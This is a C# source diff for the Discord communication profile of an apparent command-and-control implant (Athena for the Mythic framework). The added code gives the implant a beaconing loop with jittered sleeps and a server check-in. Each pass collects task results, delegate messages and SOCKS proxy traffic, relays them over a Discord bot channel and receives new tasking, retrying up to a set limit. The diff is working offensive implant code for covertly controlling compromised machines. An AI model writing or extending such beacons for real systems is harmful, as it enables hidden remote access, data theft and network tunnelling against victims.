@@ -12,44 +12,41 @@ using System.Net.Http.Headers;
 using System.IO;
 using Athena.Models.Config;
 using System.Text.Json;
+using Athena.Models.Athena.Commands;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Response;
+using Athena.Models.Mythic.Tasks;
+using System.Diagnostics;
+using Athena.Commands;
 
 namespace Profiles
 {
-    public class Config : IConfig
-    {
-        public IProfile profile { get; set; }
-        public DateTime killDate { get; set; }
-        public int sleep { get; set; }
-        public int jitter { get; set; }
-        public Config()
-        {
-            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
-            this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
-            this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
-            this.jitter = jitter;
-            this.profile = new Discord();
-        }
-    }
     public class Discord : IProfile
     {
+        private DateTime killDate { get; set; }
+        public int sleep { get; set; }
+        public int jitter { get; set; }
         public string uuid { get; set; }
         public bool encrypted { get; set; }
-        public string messageToken { get; set; }
-        public int messageChecks { get; set; }
+        private string messageToken { get; set; }
+        private int messageChecks { get; set; }
         public PSKCrypto crypt { get; set; }
         public string psk { get; set; }
-        public bool encryptedExchangeCheck { get; set; }
+        private bool encryptedExchangeCheck { get; set; }
         private HttpClient discordClient { get; set; }
         private string BotToken { get; set; }
         private string ChannelID { get; set; }
         private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
         private string userAgent { get; set; }
-        public string proxyHost { get; set; }
-        public string proxyPass { get; set; }
-        public string proxyUser { get; set; }
+        private string proxyHost { get; set; }
+        private string proxyPass { get; set; }
+        private string proxyUser { get; set; }
+        private int currentAttempt = 0;
+        private int maxAttempts = 5;
+        private CancellationTokenSource cts = new CancellationTokenSource();
         private string agent_guid = Guid.NewGuid().ToString();
+        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
+
         public Discord()
         {
             this.uuid = "%UUID%";
@@ -63,6 +60,12 @@ namespace Profiles
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.psk = "AESPSK";
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            this.sleep = sleep;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            this.jitter = jitter;
 
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -304,6 +307,90 @@ namespace Profiles
 
             return success;
         }
+
+        public async Task StartBeacon()
+        {
+            while (!cts.Token.IsCancellationRequested)
+            {
+                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
+                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
+                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
+                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask);
+
+                List<string> responses = await responseTask;
+
+                GetTasking gt = new GetTasking()
+                {
+                    action = "get_tasking",
+                    tasking_size = -1,
+                    delegates = await delegateTask,
+                    socks = await socksTask,
+                    responses = responses,
+                };
+                try
+                {
+                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
+
+                    if (String.IsNullOrEmpty(responseString))
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                    if (gtr == null)
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    this.currentAttempt = 0;
+
+                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+
+                    this.SetTaskingReceived(this, tra);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
+                    this.currentAttempt++;
+                }
+
+                if (this.currentAttempt >= this.maxAttempts)
+                {
+                    this.cts.Cancel();
+                }
+            }
+        }
+
+        public async Task<bool> StopBeacon()
+        {
+            this.cts.Cancel();
+            return true;
+        }
+
+        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        {
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
+            {
+                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+
+                if (!string.IsNullOrEmpty(res))
+                {
+                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
+
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
+        }
+
         public class MythicMessageWrapper
         {
             public string message { get; set; } = String.Empty;
